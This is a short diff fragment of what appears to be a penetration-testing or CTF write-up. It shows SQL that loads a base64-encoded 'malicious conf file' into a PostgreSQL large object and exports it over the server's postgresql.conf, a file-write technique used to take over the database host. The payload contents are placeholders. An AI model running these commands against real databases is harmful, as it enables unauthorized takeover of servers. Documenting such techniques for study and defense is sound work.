@@ -306,6 +306,12 @@ Ill cat the malicious conf file then base64 encode its output and disable word w
 SELECT lo_from_bytea(12345, decode('<base64 contents>', 'base64'))
 ```
 
+![](Pasted%20image%2020260907195348.png)
+
+This has loaded the new contents into the LOID 12345 and base64 decoded it
+
+```python]
+```
 ```python
 SELECT lo_from_bytea(12345, decode('<base64>', 'base64'))  
 SELECT lo_export(12345, '/etc/postgresql/15/main/postgresql.conf')
